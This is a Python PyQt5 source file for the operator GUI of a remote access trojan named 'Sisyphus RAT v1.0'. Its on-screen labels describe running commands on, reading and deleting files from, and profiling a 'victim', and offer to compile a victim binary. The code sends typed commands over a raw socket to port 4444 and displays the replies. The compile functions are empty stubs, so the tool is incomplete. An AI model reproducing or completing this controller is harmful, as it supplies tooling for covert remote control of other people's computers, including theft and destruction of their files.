## regular imports

import sys, os, socket

## PyQt5 imports

from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5 import QtCore
from PyQt5 import QtGui

class WindowManager(QWidget):
    def __init__(self):
        super().__init__()

        ## Window information
        self.title = "Sisyphus RAT v1.0"
        self.width = 1500
        self.height = 500

        ## run features and display output
        self.promptLabel = QLabel()
        self.command_prompt = QLineEdit()
        self.console = QTextEdit(self)
        self.execute = QPushButton("Execute")
        self.execute.clicked.connect(self.executeFeature)

        ## compile binary for linux or windows
        self.compileLabel = QLabel()
        self.compile = QPushButton("Compile")
        self.linux = QRadioButton("Linux")
        self.windows = QRadioButton("Windows")
        self.linux.toggled.connect(self.compileLinux)
        self.windows.toggled.connect(self.compileWindows)

        ## labels for features and usage
        self.runCommand = QLabel()
        self.deleteFile = QLabel()
        self.systemInfo = QLabel()
        self.networkingInfo = QLabel()
        self.readFile = QLabel()

        self.initUi()

    def initUi(self):
        self.setWindowTitle(self.title)
        self.setGeometry(10, 10, self.width, self.height)

        ## set label text contents
        self.promptLabel.setText("Run a feature ex: run_command(ls)")
        self.compileLabel.setText("Compile victim binary for either windows or linux, output to pwd")
        self.runCommand.setText("Run a command on the victim, ex: execute(ls)")
        self.deleteFile.setText("Delete a file on the victim, ex: delete(/root/file.txt)")
        self.systemInfo.setText("Display basic system info on a victim, ex: system_info()")
        self.networkingInfo.setText("Display networking info on a victim, ex: networking_info()")
        self.readFile.setText("Read a file contents on the victim, ex: read(/root/file.txt)\n")

        self.command_prompt.setMaxLength(100)
        self.command_prompt.setPlaceholderText("Enter feature with arguments and target")

        self.console.setMaximumHeight(200)
        self.console.setMaximumWidth(500)
        
        self.command_prompt.setMaximumWidth(500)

        ## add all the widgets
        layout = QGridLayout()
        layout.addWidget(self.runCommand)
        layout.addWidget(self.deleteFile)
        layout.addWidget(self.systemInfo)
        layout.addWidget(self.networkingInfo)
        layout.addWidget(self.readFile)
        layout.addWidget(self.command_prompt)
        layout.addWidget(self.console)
        layout.addWidget(self.execute)
        layout.addWidget(self.compileLabel)
        layout.addWidget(self.linux)
        layout.addWidget(self.windows)
        layout.addWidget(self.compile)

        layout.setAlignment(Qt.AlignLeft)
        layout.setSpacing(5)

        self.setLayout(layout)
        self.show()

    def executeFeature(self):
        feature = self.command_prompt.text()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = ""
        s.connect((host, 4444))
        s.send(bytes(feature, encoding="utf8"))
        results = s.recv(1024)
        results = results.decode("utf8")
        self.console.setText(results)

    def compileLinux(self):
        print("Compiling for linux")

    def compileWindows(self):
        print("Compiling for Windows")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = WindowManager()
    sys.exit(app.exec_())
